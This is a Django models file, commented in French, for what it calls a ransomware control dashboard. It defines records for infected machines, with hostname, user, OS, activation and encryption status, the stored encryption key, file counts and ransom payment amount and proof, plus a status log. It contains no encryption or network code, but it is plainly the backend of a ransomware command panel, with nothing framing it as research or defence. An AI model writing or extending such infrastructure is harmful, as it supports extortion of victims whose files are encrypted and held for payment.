"""
Models pour le dashboard de contrôle du ransomware
"""

from django.db import models
from django.utils import timezone

class InfectedMachine(models.Model):
    """Modèle représentant une machine infectée"""
    
    machine_id = models.CharField(max_length=255, unique=True, verbose_name="ID Machine")
    hostname = models.CharField(max_length=255, verbose_name="Nom d'hôte")
    username = models.CharField(max_length=255, verbose_name="Utilisateur")
    os_info = models.CharField(max_length=255, verbose_name="Système d'exploitation")
    
    # Statut
    is_activated = models.BooleanField(default=False, verbose_name="Activé")
    is_encrypted = models.BooleanField(default=False, verbose_name="Fichiers chiffrés")
    is_decrypted = models.BooleanField(default=False, verbose_name="Fichiers déchiffrés")
    
    # Clé de chiffrement
    encryption_key = models.TextField(blank=True, null=True, verbose_name="Clé de chiffrement")
    files_encrypted = models.IntegerField(default=0, verbose_name="Fichiers chiffrés")
    
    # Paiement
    payment_received = models.BooleanField(default=False, verbose_name="Paiement reçu")
    payment_amount = models.DecimalField(max_digits=10, decimal_places=2, default=0, verbose_name="Montant")
    payment_proof = models.TextField(blank=True, null=True, verbose_name="Preuve de paiement")
    
    # Dates
    registered_at = models.DateTimeField(default=timezone.now, verbose_name="Date d'enregistrement")
    activated_at = models.DateTimeField(blank=True, null=True, verbose_name="Date d'activation")
    encrypted_at = models.DateTimeField(blank=True, null=True, verbose_name="Date de chiffrement")
    decrypted_at = models.DateTimeField(blank=True, null=True, verbose_name="Date de déchiffrement")
    
    # Dernière activité
    last_seen = models.DateTimeField(default=timezone.now, verbose_name="Dernière activité")
    
    class Meta:
        verbose_name = "Machine infectée"
        verbose_name_plural = "Machines infectées"
        ordering = ['-registered_at']
    
    def __str__(self):
        return f"{self.hostname} ({self.machine_id})"
    
    def activate(self):
        """Active le ransomware sur cette machine"""
        self.is_activated = True
        self.activated_at = timezone.now()
        self.save()
    
    def mark_encrypted(self, encryption_key, files_count):
        """Marque la machine comme chiffrée"""
        self.is_encrypted = True
        self.encryption_key = encryption_key
        self.files_encrypted = files_count
        self.encrypted_at = timezone.now()
        self.save()
    
    def decrypt(self):
        """Déclenche le déchiffrement"""
        self.is_decrypted = True
        self.decrypted_at = timezone.now()
        self.save()
    
    def mark_payment(self, amount, proof=""):
        """Marque le paiement comme reçu"""
        self.payment_received = True
        self.payment_amount = amount
        self.payment_proof = proof
        self.save()


class StatusLog(models.Model):
    """Log des statuts et activités"""
    
    machine = models.ForeignKey(InfectedMachine, on_delete=models.CASCADE, related_name='logs')
    status = models.CharField(max_length=100, verbose_name="Statut")
    details = models.TextField(blank=True, verbose_name="Détails")
    timestamp = models.DateTimeField(default=timezone.now, verbose_name="Date/Heure")
    
    class Meta:
        verbose_name = "Log de statut"
        verbose_name_plural = "Logs de statut"
        ordering = ['-timestamp']
    
    def __str__(self):
        return f"{self.machine.hostname} - {self.status} - {self.timestamp}"
